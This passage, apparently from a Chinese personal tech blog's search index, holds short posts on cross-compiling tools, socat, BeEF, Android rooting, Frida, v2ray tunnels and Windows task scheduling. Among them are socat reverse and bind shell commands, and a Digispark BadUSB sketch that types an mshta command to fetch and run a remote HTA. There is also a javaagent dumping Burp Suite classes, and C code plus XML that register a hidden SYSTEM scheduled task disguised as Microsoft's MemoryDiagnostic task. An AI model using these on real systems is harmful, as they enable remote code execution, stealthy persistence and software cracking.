","permalink":"https://xhstormr.github.io/blog/posts/cross-compile-masscan/","summary":"","title":"交叉编译 masscan"},{"content":"Updated on 2020-02-05\nhttps://github.com/openjdk/jfx\nhttps://openjfx.io/javadoc/20/\nhttps://github.com/Kotlin/kotlinx.coroutines\nhttps://kotlin.github.io/kotlinx.coroutines/\nReference JavaFX http://www.javafxchina.net/ http://tutorials.jenkov.com/javafx/index.html https://gluonhq.com/products/scene-builder/ https://github.com/JonathanGiles/scenic-view Kotlin coroutines coroutines-guide coroutines-guide-ui ","permalink":"https://xhstormr.github.io/blog/posts/kotlin-coroutines/","summary":"","title":"JavaFX with Kotlin coroutines"},{"content":"Updated on 2020-01-31\njq\nStep docker pull ubuntu:rolling docker run -it --rm -v `pwd`:`pwd` -w `pwd` ubuntu:rolling sed -i \u0026#39;s/archive.ubuntu.com/mirrors.aliyun.com/g;s/security.ubuntu.com/mirrors.aliyun.com/g\u0026#39; /etc/apt/sources.list apt update \u0026amp;\u0026amp; apt -y install gcc-mingw-w64 make libtool flex bison git git clone --depth 1 --recurse-submodules -j2 https://github.com/stedolan/jq.git cd jq ; mkdir build ; cd build autoreconf -fi .. ../configure --with-oniguruma=builtin --disable-shared --enable-static --enable-all-static CFLAGS=\u0026#39;-s -Os\u0026#39; LDFLAGS=\u0026#39;-static\u0026#39; --host=\u0026#39;x86_64-w64-mingw32\u0026#39; \u0026amp;\u0026amp; make yum -y install mingw64-gcc or apt -y install gcc-mingw-w64 x86_64-w64-mingw32-gcc -s -Os -static 123.c docker pull fedora docker run -it --rm -v `pwd`:`pwd` -w `pwd` fedora curl -o /etc/yum.repos.d/fedora.repo https://mirrors.cloud.tencent.com/repo/fedora.repo curl -o /etc/yum.repos.d/fedora-updates.repo https://mirrors.cloud.tencent.com/repo/fedora-updates.repo yum clean all yum makecache yum -y install https://mirrors.cloud.tencent.com/rpmfusion/free/fedora/rpmfusion-free-release-stable.noarch.rpm \\ https://mirrors.cloud.tencent.com/rpmfusion/nonfree/fedora/rpmfusion-nonfree-release-stable.noarch.rpm cd /etc/yum.repos.d/ find -type f -exec sed -i \u0026#39;s/#baseurl/baseurl/g\u0026#39; {} + find -type f -exec sed -i \u0026#39;s/metalink/#metalink/g\u0026#39; {} + find -type f -exec sed -i \u0026#39;s@http://download1.rpmfusion.org/@https://mirrors.cloud.tencent.com/rpmfusion/@g\u0026#39; {} + yum -y install https://mirrors.tuna.tsinghua.edu.cn/fzug/free/30/x86_64/fzug-release-30-0.1.noarch.rpm yum -y install https://dl.google.com/linux/direct/google-chrome-stable_current_x86_64.rpm yum -y install java-latest-openjdk-devel.x86_64 Reference https://pkgs.org/download/mingw64-gcc https://pkgs.org/download/gcc-mingw-w64 ","permalink":"https://xhstormr.github.io/blog/posts/cross-compile-jq/","summary":"","title":"交叉编译 jq"},{"content":"Updated on 2020-01-28\nMSYS2\nsocat\nStep D:\\Work\\Download\\socat\u0026gt; pacman -Syu pacman -S --noconfirm --needed gcc make libreadline-devel ./configure CFLAGS=\u0026#39;-s -static -Os\u0026#39; \u0026amp;\u0026amp; make 单向模式: -u in -\u0026gt; out -U out \u0026lt;- in Bind Shell ---- LHOST: ncat 127.0.0.1 1234 or socat tcp-connect:127.0.0.1:1234 readline RHOST: socat tcp-listen:1234,fork,reuseaddr exec:\u0026#34;cmd\u0026#34;,pty,stderr Reverse Shell ---- LHOST: socat tcp-listen:1234,fork,reuseaddr readline RHOST: socat tcp-connect:127.0.0.1:1234 exec:\u0026#34;cmd\u0026#34;,pty,stderr 单进程应用 -\u0026gt; 多进程服务 ---- LHOST: socat -u tcp-connect:127.0.0.1:1234 - RHOST: socat -U tcp-listen:1234,fork,reuseaddr exec:\u0026#34;busybox ps\u0026#34;,pty,stderr 监听端口 ---- LHOST: socat tcp-listen:1234,fork,reuseaddr - RHOST: ncat 127.0.0.1 1234 or curl 127.0.0.1:1234 端口转发 ---- socat tcp-listen:1234,fork,reuseaddr tcp-connect:192.168.1.19:3389 写入文件 ---- echo 123 | socat -u - ./123.txt or echo 123 | socat -u - open:123.txt,wronly,create,append 读取文件 ---- socat -U - ./123.txt or socat -U - open:123.txt,rdonly 文件传输 ---- LHOST: socat -u tcp-connect:127.0.0.1:1234 open:123.txt,wronly,create,trunc RHOST: socat -U tcp-listen:1234,fork,reuseaddr open:123.txt,rdonly 内网穿透（不推荐） ---- 公网： socat tcp-listen:1234,fork,reuseaddr tcp-listen:8080 内网： socat tcp-connect:47.98.135.65:1234 tcp-connect:192.168.1.19:80 客户端： curl 47.98.135.65:8080 SSH 设置 HTTP PROXY ---- ssh -o ProxyCommand=\u0026#39;socat - PROXY:127.0.0.1:%h:%p,proxyport=8080\u0026#39; root@192.168.2.2 Reference http://www.dest-unreach.org/socat/doc/socat.html ","permalink":"https://xhstormr.github.io/blog/posts/msys2-build-socat/","summary":"","title":"构建 socat"},{"content":"Updated on 2020-01-24\nhttps://www.x.org/releases/individual/\nhttps://www.x.org/wiki/ModuleDescriptions/\nhttps://man.openbsd.org/sshd_config\nyum -y install xorg-x11-apps xorg-x11-xauth xorg-x11-server-Xorg echo X11Forwarding yes \u0026gt;\u0026gt; /etc/ssh/sshd_config echo AddressFamily inet \u0026gt;\u0026gt; /etc/ssh/sshd_config systemctl restart sshd echo $DISPLAY xeyes xmessage -file .bashrc Docker X11 Forward docker run -it --rm -v $HOME/.Xauthority:$HOME/.Xauthority:ro -e DISPLAY --net=host parrotsec/security Reference https://bugzilla.redhat.com/show_bug.cgi?id=1027197 https://stackoverflow.com/questions/16296753/can-you-run-gui-applications-in-a-docker-container ","permalink":"https://xhstormr.github.io/blog/posts/x11-server/","summary":"","title":"X11 Server"},{"content":"Updated on 2020-01-23\nhttps://github.com/lanjelot/patator\nhttps://github.com/danielmiessler/SecLists\ndocker pull parrotsec/security:latest docker run -it --rm -v `pwd`:`pwd` -w `pwd` parrotsec/security patator http_fuzz --help wget https://mirrors.aliyun.com/kali/pool/main/s/seclists/seclists_2020.1.orig.tar.gz tar -xvf seclists_2020.1.orig.tar.gz ","permalink":"https://xhstormr.github.io/blog/posts/patator/","summary":"","title":"Patator"},{"content":"Updated on 2020-01-21\nhttps://github.com/beefproject/beef\nhttps://github.com/beefproject/beef/wiki\nNative wget https://github.com/beefproject/beef/archive/master.zip unzip master.zip cd beef-master/ ./install ./set-new-pass.rb config.yaml 123456 ./beef -p 9527 \u0026amp; Ruby curl -sSL https://get.rvm.io | bash -s stable source /etc/profile.d/rvm.sh rvm reload rvm install 2.7 rvm use 2.7 --default gem sources --add https://mirrors.tuna.tsinghua.edu.cn/rubygems/ --remove https://rubygems.org/ rvm list known rvm -v ruby -v gem -v gem sources -l SQLite https://pkgs.org/download/sqlite https://kojipkgs.fedoraproject.org/packages/sqlite curl -O https://kojipkgs.fedoraproject.org/packages/sqlite/3.11.0/1.fc22/x86_64/sqlite-3.11.0-1.fc22.x86_64.rpm curl -O https://kojipkgs.fedoraproject.org/packages/sqlite/3.11.0/1.fc22/x86_64/sqlite-libs-3.11.0-1.fc22.x86_64.rpm curl -O https://kojipkgs.fedoraproject.org/packages/sqlite/3.11.0/1.fc22/x86_64/sqlite-devel-3.11.0-1.fc22.x86_64.rpm yum -y install * Docker Kali docker pull kalilinux/kali-rolling:latest docker run -it -p 9527:9527 kalilinux/kali-rolling apt update \u0026amp;\u0026amp; apt -y install beef-xss cd /usr/share/beef-xss \u0026amp;\u0026amp; ls -l Parrot docker pull parrotsec/security:latest docker run -it -p 9527:9527 parrotsec/security cd /usr/share/beef-xss \u0026amp;\u0026amp; ls -l docker start b37fcb2827f8 docker exec -it b37fcb2827f8 bash export LANG=C.UTF-8 export LANGUAGE=C.UTF-8 export LC_ALL=C.UTF-8 locale ","permalink":"https://xhstormr.github.io/blog/posts/beef/","summary":"","title":"BeEF"},{"content":"Updated on 2020-01-05\njhsdb jps -lvm jhsdb clhsdb --pid 1234 buildreplayjars app javassist https://maven.aliyun.com/repository/jcenter/org/javassist/javassist/3.26.0-GA/javassist-3.26.0-GA.jar javac -cp javassist.jar -d 123 --release 8 ClassDump.java jar -uf javassist.jar -C 123 . -javaagent:javassist.jar ClassDump.java package instrument; import javassist.ClassPool; import java.io.ByteArrayInputStream; import java.lang.instrument.ClassFileTransformer; import java.lang.instrument.IllegalClassFormatException; import java.lang.instrument.Instrumentation; import java.security.ProtectionDomain; public class ClassDump implements ClassFileTransformer { public static void premain(String agentOps, Instrumentation inst) { inst.addTransformer(new ClassDump()); } @Override public byte[] transform(ClassLoader loader, String className, Class\u0026lt;?\u0026gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException { System.out.println(className); try { if (className != null \u0026amp;\u0026amp; (className.contains(\u0026#34;burp\u0026#34;) || className.contains(\u0026#34;portswigger\u0026#34;))) { ClassPool .getDefault() .makeClass(new ByteArrayInputStream(classfileBuffer)) .writeFile(\u0026#34;D:/Download/burpsuite/\u0026#34;); } } catch (Exception e) { e.printStackTrace(); } return null; } } MANIFEST.MF Manifest-Version: 1.0 Can-Redefine-Classes: true Premain-Class: instrument.ClassDump Reference jdk.hotspot.agent https://docs.oracle.com/en/java/javase/13/docs/specs/man/jhsdb.html ","permalink":"https://xhstormr.github.io/blog/posts/jvm-class-dump/","summary":"","title":"JVM Class Dump"},{"content":"Updated on 2019-12-17\nADB https://dl.google.com/android/repository/repository2-1.xml curl -k https://dl.google.com/android/repository/platform-tools_r36.0.0-win.zip | busybox unzip - Bootloader Driver https://www.catalog.update.microsoft.com/Search.aspx?q=Google%20Android%20Bootloader%20Interface https://dl.google.com/android/repository/addon2-1.xml curl -k https://dl.google.com/android/repository/usb_driver_r13-windows.zip | busybox unzip - TWRP (Deprecated) Redmi 6: https://dl.twrp.me/cereus/ OnePlus 5: https://dl.twrp.me/cheeseburger_dumpling/ adb devices -l adb reboot bootloader fastboot devices -l fastboot oem unlock fastboot flash recovery twrp.img fastboot reboot bootloader Magisk https://topjohnwu.github.io/Magisk/install.html https://github.com/topjohnwu/Magisk/releases/latest 获取 Root 权限，不需要刷全量包，只需要解锁并刷入修改后的 Bootloader。优先级： init_boot.img \u0026gt; boot.img \u0026gt; recovery.img\nfastboot flash init_boot magisk_patched-25200_OIUkx.img # patched init_boot.img or fastboot flash boot magisk_patched-25200_OIUkx.img # patched boot.img or fastboot flash recovery magisk_patched-25200_OIUkx.img # patched recovery.img fastboot flash vbmeta --disable-verity --disable-verification vbmeta.img fastboot reboot EdXposed (Deprecated) https://github.com/RikkaApps/Riru/releases/latest https://github.com/ElderDrivers/EdXposed/releases/latest https://github.com/ElderDrivers/EdXposedManager/releases/latest adb push Magisk-v20.3.zip magisk-riru-core-v19.7.zip EdXposed-YAHFA-v0.4.6.1.4510.zip /sdcard/Download/ adb install -r EdXposedManager-4.5.4-45401-org.meowcat.edxposed.manager-release.apk LSPosed https://github.com/LSPosed/LSPosed/releases/latest https://github.com/LSPosed/LSPosed.github.io/releases 推荐使用白名单模式: /data/adb/shamiko/whitelist KernelSU https://github.com/tiann/KernelSU https://github.com/Dr-TSNG/ZygiskNext https://kernelsu.org/zh_CN/guide/installation.html#%E4%BD%BF%E7%94%A8%E7%AE%A1%E7%90%86%E5%99%A8 Non-root https://github.com/twoyi/twoyi https://github.com/taichi-framework/TaiChi Stock ROM Motorola Edge S pro PSTAR XT2153-1\nhttps://mirrors.lolinet.com/firmware/lenomola/2021/pstar/official/RETAIL/PSTAR_RETAIL_13_T1RAS33.55-15-10-6_subsidy-DEFAULT_regulatory-DEFAULT_cid50_CFC.xml.zip flashfile.xml https://github.com/dlenski/motoflash2sh https://kfhost.net/flashfile 更改 OTA 软件通道 adb devices -l adb reboot bootloader fastboot oem config carrier reteu OnePlus 13 PJZ110\nhttps://github.com/snowwolf725/OnePlus12-fw-repos/releases https://yun.daxiaamu.com/OnePlus_Roms/%E4%B8%80%E5%8A%A0OnePlus%2013/ payload.bin dumper https://github.com/ssut/payload-dumper-go payload-dumper-go --partitions init_boot,boot payload.bin pip install git+https://github.com/5ec1cff/payload-dumper payload_dumper --partitions init_boot,boot payload.bin Reference AOSP Enable Call Recording: https://github.com/jacopotediosi/GAppsMod https://github.com/chenxiaolong/BCR https://github.com/0x192/universal-android-debloater https://github.com/chiteroman/PlayIntegrityFix https://github.com/osm0sis/PlayIntegrityFork https://github.com/Dr-TSNG/Hide-My-Applist ","permalink":"https://xhstormr.github.io/blog/posts/twrp-magisk-xposed/","summary":"","title":"TWRP Magisk EdXposed"},{"content":"Updated on 2019-12-03\nTracing.aj Hook 类构造方法，通过反射修改实例属性（劣，类名会变） ---- package aop; import java.lang.reflect.Field; aspect Tracing { after() : initialization(dgh.b.new(..)) { try { Object target = thisJoinPoint.getTarget(); Field field = target.getClass().getDeclaredField(\u0026#34;a\u0026#34;); field.setAccessible(true); field.setBoolean(target, false); } catch (Exception e) { e.printStackTrace(); } } } Hook 类库方法（优） ---- package aop; aspect Tracing { boolean around(String str): call(boolean joptsimple.OptionSet.has(String)) \u0026amp;\u0026amp; args(str) { if(str == \u0026#34;demo\u0026#34;) { return false; } else { return proceed(str); } } } 编译 java -cp aspectjtools-1.9.1.jar;aspectjrt-1.9.1.jar; org.aspectj.tools.ajc.Main -d 123 -outxml -1.8 -Xlint:ignore Tracing.aj jar -uf aspectjweaver-1.9.1.jar -C 123 . 运行 -javaagent:D:\\Download\\aspectjweaver-1.9.1.jar ","permalink":"https://xhstormr.github.io/blog/posts/reverse-minecraft/","summary":"","title":"逆向 Minecraft"},{"content":"Updated on 2019-11-29\npython -m pip install --index-url=https://mirrors.aliyun.com/pypi/simple/ --upgrade platformio esptool esptool erase_flash pio update pio run --target clean pio run --target erase pio run --target upload --target monitor pio check pio device list pio device monitor --baud 115200 Reference CH340 http://www.wch.cn/downloads/CH341SER_ZIP.html PlatformIO https://platformio.org/boards https://docs.platformio.org/en/latest/platforms/espressif8266.html ESP8266 https://arduino-esp8266.readthedocs.io/en/latest/ https://github.com/esp8266/Arduino/tree/master/libraries https://www.espressif.com/zh-hans/products/hardware/esp8266ex/resources https://freeware.the-meiers.org/CoolTermWin.zip ","permalink":"https://xhstormr.github.io/blog/posts/esp8266/","summary":"","title":"ESP8266"},{"content":"Updated on 2019-11-16\n基于 Attiny85 单片机\nCode #include \u0026#34;DigiKeyboard.h\u0026#34; #define KEY_CAPSLOCK 57 void setup() { DigiKeyboard.delay(1000); DigiKeyboard.sendKeyStroke(0); DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); DigiKeyboard.delay(500); DigiKeyboard.println(\u0026#34;cmd\u0026#34;); DigiKeyboard.delay(500); DigiKeyboard.println(\u0026#34;mshta http://1.1.1.1/main.hta \u0026amp; exit\u0026#34;); } void loop() { } void setup() { pinMode(1, OUTPUT); } void loop() { digitalWrite(1, HIGH); delay(1000); digitalWrite(1, LOW); delay(1000); } Install https://github.com/arduino/Arduino https://github.com/digistump/arduino-boards-index https://github.com/digistump/DigistumpArduino/releases/latest Reference https://github.com/toxydose/Duckyspark Digispark Example DigiMouse.h DigiKeyboard.h HID Usage Tables ","permalink":"https://xhstormr.github.io/blog/posts/digispark/","summary":"","title":"Digispark BadUSB"},{"content":"Updated on 2019-11-07\nhttps://www.frida.re/docs/gadget/\nPut Src Path: code\\app\\src\\main\\jniLibs\\armeabi-v7a\\libfrida-gadget.so Bin Path: apk\\lib\\armeabi-v7a\\libfrida-gadget.so Load Java: System.loadLibrary(\u0026#34;frida-gadget\u0026#34;); Smali: const-string v0, \u0026#34;frida-gadget\u0026#34; invoke-static {v0}, Ljava/lang/System;-\u0026gt;loadLibrary(Ljava/lang/String;)V Connect frida -U Gadget -l 123.js Reference https://koz.io/using-frida-on-android-without-root/ ","permalink":"https://xhstormr.github.io/blog/posts/frida-gadget/","summary":"","title":"Frida Gadget"},{"content":"Updated on 2019-10-23\nPython 发行版\nhttps://mirrors.tuna.tsinghua.edu.cn/help/anaconda/\nhttps://anaconda.org/search\nhttps://docs.python.org/zh-cn/3/\nhttps://pythonguidecn.readthedocs.io/zh/latest/\nconda info conda list conda init fish conda update --all conda clean --all conda create -y -n myenv3 pycurl pycryptodome ripgrep python=3 conda activate myenv3 conda deactivate conda search pycryptodome conda install pycryptodome conda update pycryptodome conda remove pycryptodome conda env list conda env export -n myenv3 -f myenv3.yml conda env remove -n myenv3 .condarc channels: - conda-forge - defaults channel_priority: strict show_channel_urls: true default_channels: - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/r - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/msys2 custom_channels: conda-forge: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud msys2: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud bioconda: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud menpo: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud pytorch: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud simpleitk: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud PATH C:\\Users\\Leo\\Miniconda3 C:\\Users\\Leo\\Miniconda3\\Scripts C:\\Users\\Leo\\Miniconda3\\Library\\bin C:\\Users\\Leo\\Miniconda3\\Scripts\\activate.bat C:\\Users\\Leo\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs ","permalink":"https://xhstormr.github.io/blog/posts/miniconda/","summary":"","title":"Miniconda"},{"content":"Updated on 2019-10-20\nhttps://github.com/v2fly/v2fly-github-io/blob/master/docs/config/reverse.md\n内网 { \u0026#34;log\u0026#34;: { \u0026#34;loglevel\u0026#34;: \u0026#34;info\u0026#34; }, \u0026#34;reverse\u0026#34;: { \u0026#34;bridges\u0026#34;: [ { \u0026#34;tag\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;domain\u0026#34;: \u0026#34;example.com\u0026#34; } ] }, \u0026#34;outbounds\u0026#34;: [ { \u0026#34;tag\u0026#34;: \u0026#34;tunnel\u0026#34;, \u0026#34;protocol\u0026#34;: \u0026#34;vmess\u0026#34;, \u0026#34;settings\u0026#34;: { \u0026#34;vnext\u0026#34;: [ { \u0026#34;address\u0026#34;: \u0026#34;47.98.135.65\u0026#34;, \u0026#34;port\u0026#34;: 443, \u0026#34;users\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;b831381d-6324-4d53-ad4f-8cda48b30811\u0026#34;, \u0026#34;alterId\u0026#34;: 64 } ] } ] } }, { \u0026#34;tag\u0026#34;: \u0026#34;out\u0026#34;, \u0026#34;protocol\u0026#34;: \u0026#34;freedom\u0026#34;, \u0026#34;settings\u0026#34;: {} } ], \u0026#34;routing\u0026#34;: { \u0026#34;rules\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;field\u0026#34;, \u0026#34;inboundTag\u0026#34;: [ \u0026#34;bridge\u0026#34; ], \u0026#34;domain\u0026#34;: [ \u0026#34;full:example.com\u0026#34; ], \u0026#34;outboundTag\u0026#34;: \u0026#34;tunnel\u0026#34; }, { \u0026#34;type\u0026#34;: \u0026#34;field\u0026#34;, \u0026#34;inboundTag\u0026#34;: [ \u0026#34;bridge\u0026#34; ], \u0026#34;outboundTag\u0026#34;: \u0026#34;out\u0026#34; } ] } } 公网 { \u0026#34;log\u0026#34;: { \u0026#34;loglevel\u0026#34;: \u0026#34;info\u0026#34; }, \u0026#34;reverse\u0026#34;: { \u0026#34;portals\u0026#34;: [ { \u0026#34;tag\u0026#34;: \u0026#34;portal\u0026#34;, \u0026#34;domain\u0026#34;: \u0026#34;example.com\u0026#34; } ] }, \u0026#34;inbounds\u0026#34;: [ { \u0026#34;tag\u0026#34;: \u0026#34;tunnel\u0026#34;, \u0026#34;port\u0026#34;: 443, \u0026#34;protocol\u0026#34;: \u0026#34;vmess\u0026#34;, \u0026#34;settings\u0026#34;: { \u0026#34;clients\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;b831381d-6324-4d53-ad4f-8cda48b30811\u0026#34;, \u0026#34;alterId\u0026#34;: 64 } ] } }, { \u0026#34;tag\u0026#34;: \u0026#34;in\u0026#34;, \u0026#34;port\u0026#34;: 9527, \u0026#34;protocol\u0026#34;: \u0026#34;socks\u0026#34;, \u0026#34;settings\u0026#34;: { \u0026#34;auth\u0026#34;: \u0026#34;password\u0026#34;, \u0026#34;accounts\u0026#34;: [ { \u0026#34;user\u0026#34;: \u0026#34;123\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;456\u0026#34; } ] } } ], \u0026#34;routing\u0026#34;: { \u0026#34;rules\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;field\u0026#34;, \u0026#34;inboundTag\u0026#34;: [ \u0026#34;tunnel\u0026#34; ], \u0026#34;domain\u0026#34;: [ \u0026#34;full:example.com\u0026#34; ], \u0026#34;outboundTag\u0026#34;: \u0026#34;portal\u0026#34; }, { \u0026#34;type\u0026#34;: \u0026#34;field\u0026#34;, \u0026#34;inboundTag\u0026#34;: [ \u0026#34;in\u0026#34; ], \u0026#34;outboundTag\u0026#34;: \u0026#34;portal\u0026#34; } ] } } 服务暴露型内网穿透 ---- { \u0026#34;tag\u0026#34;: \u0026#34;in\u0026#34;, \u0026#34;port\u0026#34;: 9527, \u0026#34;protocol\u0026#34;: \u0026#34;dokodemo-door\u0026#34;, \u0026#34;settings\u0026#34;: { \u0026#34;address\u0026#34;: \u0026#34;127.0.0.1\u0026#34;, \u0026#34;port\u0026#34;: 3389, \u0026#34;network\u0026#34;: \u0026#34;tcp\u0026#34; } } 客户端 { \u0026#34;log\u0026#34;: { \u0026#34;loglevel\u0026#34;: \u0026#34;info\u0026#34; }, \u0026#34;inbound\u0026#34;: { \u0026#34;port\u0026#34;: 1080, \u0026#34;listen\u0026#34;: \u0026#34;127.0.0.1\u0026#34;, \u0026#34;protocol\u0026#34;: \u0026#34;socks\u0026#34;, \u0026#34;settings\u0026#34;: { \u0026#34;auth\u0026#34;: \u0026#34;noauth\u0026#34; } }, \u0026#34;outbound\u0026#34;: { \u0026#34;protocol\u0026#34;: \u0026#34;socks\u0026#34;, \u0026#34;settings\u0026#34;: { \u0026#34;servers\u0026#34;: [ { \u0026#34;address\u0026#34;: \u0026#34;47.98.135.65\u0026#34;, \u0026#34;port\u0026#34;: 9527, \u0026#34;users\u0026#34;: [ { \u0026#34;user\u0026#34;: \u0026#34;123\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;456\u0026#34; } ] } ] } } } ","permalink":"https://xhstormr.github.io/blog/posts/reverse/","summary":"","title":"内网穿透"},{"content":"Updated on 2019-10-04\nhttps://docs.microsoft.com/zh-cn/windows/win32/api/taskschd/nf-taskschd-itaskfolder-registertask\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;comdef.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;taskschd.h\u0026gt; BSTR _com_util::ConvertStringToBSTR(const char *ascii) { int len = strlen(ascii); BSTR bstr = SysAllocStringLen(NULL, len); mbstowcs(bstr, ascii, len); return bstr; } char *read() { FILE *file = fopen(\u0026#34;123.xml\u0026#34;, \u0026#34;rb\u0026#34;); fseek(file, 0, SEEK_END); long fileSize = ftell(file); rewind(file); char *text = (char *)malloc(fileSize + 1); fread(text, sizeof(char), fileSize, file); text[fileSize] = 0; fclose(file); return text; } int main(int agrc, char *agrv[]) { CoInitializeEx(NULL, COINIT_MULTITHREADED); ITaskService *pService = NULL; CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void **)\u0026amp;pService); ITaskFolder *pRootFolder = NULL; pService-\u0026gt;Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t()); pService-\u0026gt;GetFolder(_bstr_t(\u0026#34;\\\\Microsoft\\\\Windows\\\\MemoryDiagnostic\u0026#34;), \u0026amp;pRootFolder); pService-\u0026gt;Release(); IRegisteredTask *pRegisteredTask = NULL; char *text = read(); HRESULT hr = pRootFolder-\u0026gt;RegisterTask( _bstr_t(\u0026#34;ProcessMemoryDiagnosticEvents\u0026#34;), _bstr_t(text), TASK_CREATE_OR_UPDATE, _variant_t(), _variant_t(), TASK_LOGON_SERVICE_ACCOUNT, _variant_t(), \u0026amp;pRegisteredTask ); if (FAILED(hr)) { printf(\u0026#34;Error saving the Task: %x\u0026#34;, hr); } else { BSTR path; pRegisteredTask-\u0026gt;get_Path(\u0026amp;path); printf(\u0026#34;Path: %ls\\n\u0026#34;, path); double vtime; SYSTEMTIME stime; pRegisteredTask-\u0026gt;get_NextRunTime(\u0026amp;vtime); VariantTimeToSystemTime(vtime, \u0026amp;stime); printf(\u0026#34;NextRunTime: %d/%02d/%02d %02d:%02d:%02d\\n\u0026#34;, stime.wYear, stime.wMonth, stime.wDay, stime.wHour, stime.wMinute, stime.wSecond); pRegisteredTask-\u0026gt;Release(); } free(text); pRootFolder-\u0026gt;Release(); CoUninitialize(); return 0; } g++ 123.c -ltaskschd -lole32 -loleaut32 -s -static objdump -x a.exe | findstr DLL Reference https://github.com/qemu/qemu/blob/v4.1.0/qga/vss-win32/install.cpp#L485 ","permalink":"https://xhstormr.github.io/blog/posts/registertask-api/","summary":"","title":"Win32 RegisterTask API"},{"content":"Updated on 2019-10-04\n123.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; ?\u0026gt; \u0026lt;Task version=\u0026#34;1.6\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/windows/2004/02/mit/task\u0026#34;\u0026gt; \u0026lt;RegistrationInfo\u0026gt; \u0026lt;Source\u0026gt;Microsoft Corporation\u0026lt;/Source\u0026gt; \u0026lt;Author\u0026gt;Microsoft Corporation\u0026lt;/Author\u0026gt; \u0026lt;URI\u0026gt;\\Microsoft\\Windows\\MemoryDiagnostic\\ProcessMemoryDiagnosticEvents\u0026lt;/URI\u0026gt; \u0026lt;/RegistrationInfo\u0026gt; \u0026lt;Triggers\u0026gt; \u0026lt;TimeTrigger\u0026gt; \u0026lt;Repetition\u0026gt; \u0026lt;Interval\u0026gt;PT1H\u0026lt;/Interval\u0026gt; \u0026lt;StopAtDurationEnd\u0026gt;false\u0026lt;/StopAtDurationEnd\u0026gt; \u0026lt;/Repetition\u0026gt; \u0026lt;StartBoundary\u0026gt;2000-01-01T00:00:00\u0026lt;/StartBoundary\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;/TimeTrigger\u0026gt; \u0026lt;/Triggers\u0026gt; \u0026lt;Principals\u0026gt; \u0026lt;Principal id=\u0026#34;LocalSystem\u0026#34;\u0026gt; \u0026lt;UserId\u0026gt;S-1-5-18\u0026lt;/UserId\u0026gt; \u0026lt;RunLevel\u0026gt;HighestAvailable\u0026lt;/RunLevel\u0026gt; \u0026lt;/Principal\u0026gt; \u0026lt;/Principals\u0026gt; \u0026lt;Settings\u0026gt; \u0026lt;MultipleInstancesPolicy\u0026gt;IgnoreNew\u0026lt;/MultipleInstancesPolicy\u0026gt; \u0026lt;DisallowStartIfOnBatteries\u0026gt;false\u0026lt;/DisallowStartIfOnBatteries\u0026gt; \u0026lt;StopIfGoingOnBatteries\u0026gt;false\u0026lt;/StopIfGoingOnBatteries\u0026gt; \u0026lt;AllowHardTerminate\u0026gt;false\u0026lt;/AllowHardTerminate\u0026gt; \u0026lt;StartWhenAvailable\u0026gt;true\u0026lt;/StartWhenAvailable\u0026gt; \u0026lt;RunOnlyIfNetworkAvailable\u0026gt;false\u0026lt;/RunOnlyIfNetworkAvailable\u0026gt; \u0026lt;IdleSettings\u0026gt; \u0026lt;StopOnIdleEnd\u0026gt;false\u0026lt;/StopOnIdleEnd\u0026gt; \u0026lt;RestartOnIdle\u0026gt;true\u0026lt;/RestartOnIdle\u0026gt; \u0026lt;/IdleSettings\u0026gt; \u0026lt;AllowStartOnDemand\u0026gt;true\u0026lt;/AllowStartOnDemand\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;Hidden\u0026gt;true\u0026lt;/Hidden\u0026gt; \u0026lt;RunOnlyIfIdle\u0026gt;false\u0026lt;/RunOnlyIfIdle\u0026gt; \u0026lt;DisallowStartOnRemoteAppSession\u0026gt;false\u0026lt;/DisallowStartOnRemoteAppSession\u0026gt; \u0026lt;UseUnifiedSchedulingEngine\u0026gt;true\u0026lt;/UseUnifiedSchedulingEngine\u0026gt; \u0026lt;WakeToRun\u0026gt;true\u0026lt;/WakeToRun\u0026gt; \u0026lt;ExecutionTimeLimit\u0026gt;PT0S\u0026lt;/ExecutionTimeLimit\u0026gt; \u0026lt;Priority\u0026gt;0\u0026lt;/Priority\u0026gt; \u0026lt;RestartOnFailure\u0026gt; \u0026lt;Interval\u0026gt;PT5M\u0026lt;/Interval\u0026gt; \u0026lt;Count\u0026gt;3\u0026lt;/Count\u0026gt; \u0026lt;/RestartOnFailure\u0026gt; \u0026lt;/Settings\u0026gt; \u0026lt;Actions Context=\u0026#34;LocalSystem\u0026#34;\u0026gt; \u0026lt;Exec\u0026gt; \u0026lt;Command\u0026gt;\u0026#34;%ProgramFiles%\\Waves\\python\\pythonw.exe\u0026#34;\u0026lt;/Command\u0026gt; \u0026lt;Arguments\u0026gt;123.pyc\u0026lt;/Arguments\u0026gt; \u0026lt;WorkingDirectory\u0026gt;%ProgramFiles%\\Waves\\python\u0026lt;/WorkingDirectory\u0026gt; \u0026lt;/Exec\u0026gt; \u0026lt;/Actions\u0026gt; \u0026lt;/Task\u0026gt; Reference https://docs.microsoft.com/zh-cn/windows/win32/taskschd/task-scheduler-schema https://docs.microsoft.com/zh-cn/windows/security/identity-protection/access-control/security-identifiers 123.pyc 